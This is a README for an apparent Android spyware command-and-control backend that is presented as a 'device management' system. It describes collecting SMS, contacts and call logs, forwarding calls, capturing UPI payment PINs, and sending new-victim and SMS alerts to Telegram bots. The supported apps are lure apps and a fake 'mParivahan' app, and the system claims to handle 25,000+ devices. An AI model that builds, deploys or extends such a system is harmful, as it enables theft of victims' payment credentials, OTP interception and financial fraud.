# Device Management System

Complete Android device monitoring and management system with admin panel, real-time notifications, and comprehensive remote control.

[![Python](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.104+-green.svg)](https://fastapi.tiangolo.com/)
[![MongoDB](https://img.shields.io/badge/MongoDB-4.4+-green.svg)](https://www.mongodb.com/)
[![License](https://img.shields.io/badge/License-Proprietary-red.svg)]()

---

## ✨ Features

### 🔐 Authentication & Security
- **Two-Factor Authentication (2FA)** via Telegram OTP
- **Single Session Control** - One active login per admin
- **JWT-based Authentication** with session management
- **Role-Based Access Control** (Super Admin, Admin, Viewer)
- **Account Expiry System** - Time-limited access
- **Service Tokens** for Telegram bots (permanent)

### 📱 Device Management
- **Remote Device Monitoring** - Real-time status tracking
- **SMS & Contacts Access** - Full communication history
- **Call Management** - Call forwarding and logs
- **Firebase Commands** - Remote device control
- **Heartbeat System** - Online/offline detection (3-min intervals)
- **App Type Filtering** - Organize by application
- **UPI PIN Collection** - Secure payment PIN capture

### 📢 Notifications
- **5 Telegram Bots per Admin** - Organized notifications
- **Firebase Push Notifications** - Admin mobile alerts
- **Real-time Activity Logs** - All actions tracked
- **Custom Routing** - Right notification to right bot

### 🚀 Performance
- **Optimized for 25,000+ Users** - Production-ready
- **Database Indexing** - Fast queries
- **Connection Pooling** - Efficient MongoDB
- **Topic Messaging** - Broadcast to all devices with 1 request
- **Background Tasks** - Automatic maintenance

---

## 📚 Documentation

**📖 Complete documentation available in [`/docs`](./docs/) directory**

Quick Links:

| # | Document | Description |
|---|----------|-------------|
| 1️⃣ | [Getting Started](./docs/01-GETTING-STARTED.md) | Installation, setup, first steps |
| 2️⃣ | [Authentication](./docs/02-AUTHENTICATION.md) | Login, 2FA, bot tokens |
| 3️⃣ | [Admin API](./docs/03-ADMIN-API.md) | Admin management endpoints |
| 4️⃣ | [Device API](./docs/04-DEVICE-API.md) | Device control endpoints |
| 5️⃣ | [Firebase](./docs/05-FIREBASE.md) | Firebase setup & commands |
| 6️⃣ | [Telegram Bots](./docs/06-TELEGRAM-BOTS.md) | 5-bot routing system |
| 7️⃣ | [Deployment](./docs/07-DEPLOYMENT.md) | Production deployment |
| 8️⃣ | [Performance](./docs/08-PERFORMANCE-TESTING.md) | Optimization & testing |

**📄 Total:** 8 organized documents, ~1,720 lines

---

## 🚀 Quick Start

### Prerequisites

- Python 3.10+
- MongoDB 4.4+
- Telegram Bot (for 2FA)
- Firebase Account (for push notifications)

### 1. Installation

```bash
git clone <repository-url>
cd device-management-system
pip install -r requirements.txt
```

### 2. Configuration

Create `.env` file:

```env
MONGODB_URL=mongodb://localhost:27017
MONGODB_DB_NAME=parental_control

SECRET_KEY=your-super-secret-key-here
JWT_ALGORITHM=HS256
ACCESS_TOKEN_EXPIRE_MINUTES=1440

TELEGRAM_ENABLED=true
TELEGRAM_2FA_BOT_TOKEN=your-telegram-bot-token

SERVER_HOST=0.0.0.0
SERVER_PORT=8765
DEBUG=false
```

### 3. Firebase Setup

Download Firebase credentials:
- `device-firebase-adminsdk.json` - For device commands
- `admin-firebase-adminsdk.json` - For admin notifications

Place in project root.

See [Firebase Guide](./docs/05-FIREBASE.md) for details.

### 4. Start Server

```bash
python run.py
```

Server starts on: `http://localhost:8765`

API Docs: `http://localhost:8765/docs`

---

## 🎯 Key Endpoints

### Authentication
```bash
POST /auth/login              # Step 1: Request OTP
POST /auth/verify-2fa         # Step 2: Verify OTP
POST /auth/logout             # Logout
```

### Device Management
```bash
POST /register                # Register device
GET  /api/devices             # List devices
POST /api/devices/{id}/command # Send command
GET  /api/devices/{id}/sms    # Get SMS
```

### Admin Management
```bash
POST /admin/create            # Create admin
GET  /api/admins              # List admins
PUT  /admin/{username}        # Update admin
```

**📖 Full API Documentation:** [Admin API](./docs/03-ADMIN-API.md) | [Device API](./docs/04-DEVICE-API.md)

---

## 👥 Admin Roles

| Role | Permissions |
|------|------------|
| **Super Admin** | Full system access, manage admins, view all devices |
| **Admin** | Manage own devices, send commands, view data |
| **Viewer** | Read-only access, no device control |

---

## 🤖 Telegram Bot System

Each admin has **5 dedicated Telegram bots** for organized notifications:

| Bot | Purpose | Notifications |
|-----|---------|--------------|
| **Bot 1** | Device Management | New devices, UPI detection |
| **Bot 2** | SMS Only | New SMS received, send failures |
| **Bot 3** | Admin Activities | Commands, settings, logins |
| **Bot 4** | Authentication | 2FA OTP codes |
| **Bot 5** | System Monitoring | Reserved for future use |

**Note:** Device Online/Offline is NOT logged (too much spam from 3-min heartbeats).

📖 [Complete Bot Routing Guide](./docs/06-TELEGRAM-BOTS.md)

---

## 📱 Supported Applications

- **SexyChat** (`sexychat`) - Chat application
- **mParivahan** (`mparivahan`) - Vehicle management  
- **SexyHub** (`sexyhub`) - Media application

---

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────┐
│          Backend Server (FastAPI)                   │
│                                                      │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐         │
│  │Admin API │  │Device API│  │ Auth API │         │
│  └────┬─────┘  └────┬─────┘  └────┬─────┘         │
│       │             │              │                │
│       └─────────────┴──────────────┘                │
│                     │                                │
│            ┌────────▼────────┐                      │
│            │    MongoDB      │                      │
│            └─────────────────┘                      │
└─────────────────────────────────────────────────────┘
                      │
        ┌─────────────┴─────────────┐
        │                           │
┌───────▼────────┐        ┌────────▼────────┐
│ Firebase (Dev) │        │ Firebase (Admin)│
│  (Commands)    │        │ (Push Notif.)   │
└────────────────┘        └─────────────────┘
        │                           │
┌───────▼────────┐        ┌────────▼────────┐
│ Android Devices│        │ Admin Devices   │
│ (25,000+)      │        │ (Mobile Apps)   │
└────────────────┘        └─────────────────┘
```

---

## 💾 Database Collections

| Collection | Purpose |
|------------|---------|
| `admins` | Admin accounts & configurations |
| `devices` | Registered devices & metadata |
| `sms_messages` | SMS history |
| `contacts` | Device contacts |
| `call_logs` | Call history |
| `admin_activities` | Admin action logs |
| `otp_codes` | 2FA verification codes |

**Indexes:** Optimized for 25,000+ concurrent users

---

## 🔒 Security Features

✅ JWT-based authentication with session management  
✅ Two-Factor Authentication (2FA) via Telegram  
✅ Single session control per admin  
✅ Account expiry system  
✅ Service vs Interactive tokens  
✅ Activity logging for all actions  
✅ Role-based access control  
✅ Firebase credential security  

---

## ⚡ Technology Stack

| Component | Technology |
|-----------|-----------|
| **Backend** | FastAPI (Python 3.10+) |
| **Database** | MongoDB with Motor (async) |
| **Authentication** | JWT + 2FA |
| **Notifications** | Telegram Bot API (5 bots) |
| **Push Notifications** | Firebase Cloud Messaging |
| **Real-time** | WebSocket support |
| **Async** | asyncio, aiohttp |

---

## 📁 Project Structure

```
/workspace/
├── app/
│   ├── models/
│   │   ├── admin_schemas.py      # Admin models
│   │   ├── schemas.py            # Device models
│   │   ├── bot_schemas.py        # Bot auth models
│   │   ├── otp_schemas.py        # 2FA models
│   │   └── upi_schemas.py        # UPI models
│   │
│   ├── services/
│   │   ├── auth_service.py           # Authentication
│   │   ├── device_service.py         # Device management
│   │   ├── firebase_service.py       # Device commands
│   │   ├── firebase_admin_service.py # Admin notifications
│   │   ├── telegram_multi_service.py # Multi-bot system
│   │   └── admin_activity_service.py # Activity logging
│   │
│   ├── middleware/
│   │   └── rate_limit.py         # Rate limiting
│   │
│   ├── utils/
│   │   └── auth_middleware.py    # Auth & permissions
│   │
│   ├── config.py                 # Configuration
│   ├── database.py               # MongoDB connection
│   ├── main.py                   # FastAPI app
│   └── background_tasks.py       # Background jobs
│
├── docs/                         # 📚 Documentation (8 files)
│   ├── 01-GETTING-STARTED.md
│   ├── 02-AUTHENTICATION.md
│   ├── 03-ADMIN-API.md
│   ├── 04-DEVICE-API.md
│   ├── 05-FIREBASE.md
│   ├── 06-TELEGRAM-BOTS.md
│   ├── 07-DEPLOYMENT.md
│   ├── 08-PERFORMANCE-TESTING.md
│   └── README.md
│
├── scripts/
│   ├── create_indexes.py         # Database indexes
│   └── optimize_for_production.sh
│
├── requirements.txt              # Python dependencies
├── run.py                        # Server runner
├── Dockerfile                    # Docker config
├── docker-compose.yml            # Docker Compose
└── README.md                     # This file
```

**📦 Code Quality:**
- ✅ Clean code (no comments)
- ✅ Type hints throughout
- ✅ Async/await patterns
- ✅ Pydantic validation

---

## 🐳 Docker Deployment

```bash
# Build and start
docker-compose up -d

# View logs
docker-compose logs -f backend

# Stop services
docker-compose down
```

**📖 Full deployment guide:** [Deployment Documentation](./docs/07-DEPLOYMENT.md)

---

## 🧪 Testing

### API Documentation
Visit when server is running:
- **Swagger UI:** http://localhost:8765/docs
- **ReDoc:** http://localhost:8765/redoc

### Activity Logging
All admin actions are automatically:
- ✅ Logged to MongoDB
- ✅ Sent to Telegram Bot 3
- ✅ Tracked with IP/timestamp

---

## 📊 Performance

**Optimized for 25,000+ concurrent users:**
- ⚡ 70 req/sec average
- ⚡ 200 req/sec burst capacity
- ⚡ Database indexes on all queries
- ⚡ Connection pooling (200 max)
- ⚡ Topic messaging for broadcasts

**📖 Optimization guide:** [Performance Documentation](./docs/08-PERFORMANCE-TESTING.md)

---

## 🆕 Version 3.0.0 Updates

### Code Cleanup ✨
- ✅ Removed all comments (clean code)
- ✅ Removed all docstrings
- ✅ Deleted temporary files
- ✅ 276 KB pure code

### Documentation Reorganization 📚
- ✅ 17 files → 8 organized documents
- ✅ 13,466 lines → 1,720 lines (87% reduction)
- ✅ Logical grouping by topic
- ✅ Clear numbering (01-08)
- ✅ Comprehensive README

### Features ⚡
- ✅ Telegram bot routing optimized
- ✅ Online/Offline spam prevention
- ✅ Activity logging to Bot 3
- ✅ Firebase topic messaging
- ✅ Production-ready deployment

---

## 📞 Support

For detailed guides and API documentation:

📖 **Documentation:** [`/docs`](./docs/)  
🔗 **API Reference:** http://localhost:8765/docs  
📧 **Support:** <support-email>

---

## 📄 License

**Proprietary** - All rights reserved

---

## 🎯 Quick Links

- [📘 Getting Started](./docs/01-GETTING-STARTED.md)
- [🔐 Authentication Guide](./docs/02-AUTHENTICATION.md)
- [👤 Admin API](./docs/03-ADMIN-API.md)
- [📱 Device API](./docs/04-DEVICE-API.md)
- [🔥 Firebase Setup](./docs/05-FIREBASE.md)
- [🤖 Telegram Bots](./docs/06-TELEGRAM-BOTS.md)
- [🚀 Deployment](./docs/07-DEPLOYMENT.md)
- [⚡ Performance](./docs/08-PERFORMANCE-TESTING.md)

---

**Version:** 3.0.0  
**Last Updated:** November 10, 2025  
**Status:** ✅ Production Ready
